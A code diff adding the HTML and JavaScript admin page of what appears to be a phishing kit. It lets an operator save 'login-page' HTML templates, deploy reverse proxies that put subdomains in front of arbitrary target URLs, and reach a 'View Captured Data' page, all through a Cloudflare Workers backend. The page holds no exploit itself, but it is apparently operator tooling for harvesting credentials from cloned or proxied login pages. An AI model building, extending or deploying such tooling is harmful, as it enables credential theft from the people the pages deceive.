@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-TECH Cloud Admin</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { margin-top: 0; color: #0070f3; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        textarea { height: 150px; font-family: monospace; }
+        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
+        button.btn-danger { background: #d32f2f; }
+        button:hover { opacity: 0.9; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
+        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
+        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
+        .hidden { display: none; }
+        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .nav-links { margin-bottom: 20px; text-align: right; }
+        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
+
+        /* Table Styles */
+        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
+        th { background: #fafafa; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav-links">
+            <a href="captures.html">View Captured Data &rarr;</a>
+        </div>
+        <h1>🚀 Cloud Admin Panel</h1>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
+            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
+        </div>
+
+        <!-- Templates Section -->
+        <div id="templates-section" class="form-section">
+            <h2>Existing Templates</h2>
+            <div id="template-list">Loading...</div>
+
+            <h3>Add New Template</h3>
+            <div class="form-group">
+                <label>Template Name</label>
+                <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
+            </div>
+            <div class="form-group">
+                <label>HTML Content</label>
+                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
+            </div>
+            <button onclick="saveTemplate()">Save Template</button>
+        </div>
+
+        <!-- Proxy Form (Legacy Admin Feature) -->
+        <div id="proxy-section" class="form-section hidden">
+            <p>Admin-only proxy deployment (bypasses templates).</p>
+            <div class="form-group">
+                <label>Subdomain</label>
+                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
+            </div>
+            <div class="form-group">
+                <label>Target URL</label>
+                <input type="text" id="proxy-url" placeholder="https://example.com">
+            </div>
+            <button onclick="saveProxy()">Create Proxy</button>
+        </div>
+
+        <div id="message"></div>
+    </div>
+
+    <script>
+        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+
+        function switchTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));
+
+            if (tab === 'templates') {
+                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
+                document.getElementById('templates-section').classList.remove('hidden');
+                loadTemplates();
+            } else {
+                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
+                document.getElementById('proxy-section').classList.remove('hidden');
+            }
+        }
+
+        async function loadTemplates() {
+            try {
+                const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });
+
+                if (res.status === 401) {
+                    window.location.href = 'login.html';
+                    return;
+                }
+
+                const data = await res.json();
+                const list = document.getElementById('template-list');
+                list.innerHTML = ''; // Clear loading
+
+                if (data.success && data.data.length > 0) {
+                    const table = document.createElement('table');
+
+                    // Header
+                    const thead = document.createElement('thead');
+                    const headerRow = document.createElement('tr');
+                    const thName = document.createElement('th');
+                    thName.textContent = 'Name';
+                    const thAction = document.createElement('th');
+                    thAction.textContent = 'Action';
+                    headerRow.appendChild(thName);
+                    headerRow.appendChild(thAction);
+                    thead.appendChild(headerRow);
+                    table.appendChild(thead);
+
+                    // Body
+                    const tbody = document.createElement('tbody');
+                    data.data.forEach(tpl => {
+                        const tr = document.createElement('tr');
+
+                        const tdName = document.createElement('td');
+                        tdName.textContent = tpl.name;
+
+                        const tdAction = document.createElement('td');
+                        const btn = document.createElement('button');
+                        btn.className = 'btn-danger';
+                        btn.style.width = 'auto';
+                        btn.style.padding = '5px 10px';
+                        btn.textContent = 'Delete';
+                        btn.onclick = () => deleteTemplate(tpl.name);
+                        tdAction.appendChild(btn);
+
+                        tr.appendChild(tdName);
+                        tr.appendChild(tdAction);
+                        tbody.appendChild(tr);
+                    });
+                    table.appendChild(tbody);
+                    list.appendChild(table);
+                } else {
+                    const p = document.createElement('p');
+                    p.textContent = 'No templates found.';
+                    list.appendChild(p);
+                }
+            } catch (e) {
+                document.getElementById('template-list').innerText = 'Error loading templates.';
+            }
+        }
+
+        async function saveTemplate() {
+            const name = document.getElementById('tpl-name').value;
+            const content = document.getElementById('tpl-content').value;
+            if (!name || !content) return showMessage('Missing fields', 'error');
+
+            const btn = document.querySelector('button'); // Careful selector
+            const originalText = btn.innerText;
+            btn.innerText = 'Saving...';
+
+            try {
+                const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({name, content}),
+                    credentials: 'include'
+                });
+                if (res.status === 401) {
+                    window.location.href = 'login.html';
+                    return;
+                }
+                const data = await res.json();
+                if (data.success) {
+                    showMessage('Template saved!', 'success');
+                    document.getElementById('tpl-name').value = '';
+                    document.getElementById('tpl-content').value = '';
+                    loadTemplates();
+                } else {
+                    showMessage(data.error, 'error');
+                }
+            } catch (e) {
+                showMessage(e.message, 'error');
+            }
+            btn.innerText = originalText;
+        }
+
+        async function deleteTemplate(name) {
+            if(!confirm('Delete template ' + name + '?')) return;
+            try {
+                 const res = await fetch(`${WORKER_URL}/api/admin/templates?name=` + name, {
+                     method: 'DELETE',
+                     credentials: 'include'
+                 });
+                 if (res.status === 401) {
+                     window.location.href = 'login.html';
+                     return;
+                 }
+                 loadTemplates();
+            } catch(e) {
+                alert(e.message);
+            }
+        }
+
+        async function saveProxy() {
+            const subdomain = document.getElementById('proxy-subdomain').value;
+            const content = document.getElementById('proxy-url').value;
+            if (!subdomain || !content) return showMessage('Missing fields', 'error');
+
+            try {
+                const response = await fetch(`${WORKER_URL}/api/save`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ subdomain, type: 'PROXY', content }),
+                    credentials: 'include'
+                });
+                if (response.status === 401) {
+                    window.location.href = 'login.html';
+                    return;
+                }
+                const result = await response.json();
+                if (result.success) showMessage('Proxy created!', 'success');
+                else showMessage(result.error, 'error');
+            } catch (err) {
+                showMessage('Network Error: ' + err.message, 'error');
+            }
+        }
+
+        function showMessage(text, type) {
+            const el = document.getElementById('message');
+            el.innerText = text;
+            el.className = type;
+            el.style.display = 'block';
+        }
+
+        // Initial load
+        loadTemplates();
+    </script>
+</body>
+</html>
